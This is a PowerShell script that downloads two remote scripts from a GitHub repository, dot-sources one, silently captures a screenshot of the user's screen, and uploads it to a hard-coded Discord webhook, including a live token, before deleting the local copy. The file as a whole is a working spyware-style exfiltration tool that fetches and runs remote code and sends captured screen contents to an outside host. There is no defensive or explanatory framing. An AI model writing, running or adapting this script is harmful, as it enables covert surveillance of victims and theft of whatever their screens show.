# Define the path where the screenshot will be saved in the temp directory
$tempDir = [System.IO.Path]::GetTempPath()
$screenshotPath = [System.IO.Path]::Combine($tempDir, "screenshot.png")

# Define the Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1264663197034610729/-_OMi5NaidSJ5_MUmuZb8q4jW7fm19m7DUjqHWCh5qp8e-xfKarYQXmlfKP2plGB8eWI"

# URLs to download the scripts
$scUrl = "https://raw.githubusercontent.com/nickfour/temp-sc/main/sc.ps1"
$screenshotUrl = "https://raw.githubusercontent.com/nickfour/temp-sc/main/Take-Screenshot.ps1"

# Define paths for downloaded scripts
$scPath = [System.IO.Path]::Combine($tempDir, "sc.ps1")
$screenshotScriptPath = [System.IO.Path]::Combine($tempDir, "Take-Screenshot.ps1")

# Function to download a file from a URL
function Download-File {
    param (
        [string]$Url,
        [string]$DestinationPath
    )

    try {
        $client = New-Object System.Net.WebClient
        $client.DownloadFile($Url, $DestinationPath)
        Write-Host "Downloaded $Url to $DestinationPath"
    } catch {
        Write-Error "Failed to download ${Url}: $_"
    }
}

# Download the scripts
Download-File -Url $scUrl -DestinationPath $scPath
Download-File -Url $screenshotUrl -DestinationPath $screenshotScriptPath

# Import the screenshot module
if (Test-Path $screenshotScriptPath) {
    . $screenshotScriptPath
} else {
    Write-Host "Take-Screenshot.ps1 not found at $screenshotScriptPath."
    exit
}

# Take a screenshot if it does not already exist
if (-not (Test-Path $screenshotPath)) {
    Take-Screenshot -Path $screenshotPath
}

# Load .NET HttpClient and related classes
Add-Type -AssemblyName "System.Net.Http"

# Create HttpClient instance
$httpClient = [System.Net.Http.HttpClient]::new()

# Prepare the multipart form data
$multipartContent = [System.Net.Http.MultipartFormDataContent]::new()

# Add text part
$textContent = [System.Net.Http.StringContent]::new("Here is the screenshot")
$textDisposition = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue "form-data"
$textDisposition.Name = "content"
$textContent.Headers.ContentDisposition = $textDisposition
$multipartContent.Add($textContent)

# Add file part
$fileContent = [System.Net.Http.ByteArrayContent]::new([System.IO.File]::ReadAllBytes($screenshotPath))
$fileDisposition = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue "form-data"
$fileDisposition.Name = "file"
$fileDisposition.FileName = [System.IO.Path]::GetFileName($screenshotPath)
$fileContent.Headers.ContentDisposition = $fileDisposition
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png")
$multipartContent.Add($fileContent)

# Send the request
$response = $httpClient.PostAsync($webhookUrl, $multipartContent).Result

# Check the response
if ($response.StatusCode -eq [System.Net.HttpStatusCode]::NoContent) {
    Write-Host "Screenshot uploaded successfully."
} else {
    Write-Host "Failed to upload screenshot. Status Code: $($response.StatusCode)"
}

# Optionally, remove the screenshot file after sending
if (Test-Path $screenshotPath) {
    Remove-Item -Path $screenshotPath -Force
}
